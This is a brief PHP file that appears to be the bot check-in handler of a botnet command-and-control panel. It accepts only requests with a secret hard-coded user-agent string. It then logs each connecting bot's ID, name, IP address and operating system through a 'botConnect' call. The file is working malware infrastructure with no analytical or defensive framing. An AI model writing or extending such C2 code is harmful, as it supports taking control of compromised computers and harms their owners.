<?php

if ($_SERVER['HTTP_USER_AGENT'] == 'HeHDoNgS')
{
$path = $_SERVER['DOCUMENT_ROOT'];
$path .= "/panel 2/_conf/inc/connection.class.php";

include_once($path);


$uid = $_POST['uid'];
$name = $_POST['name'];
$ip = $_SERVER['REMOTE_ADDR']; 
$os = $_POST['os'];
$time = time();

$bots->botConnect($uid, $name, $ip, $os, $time);
}

?>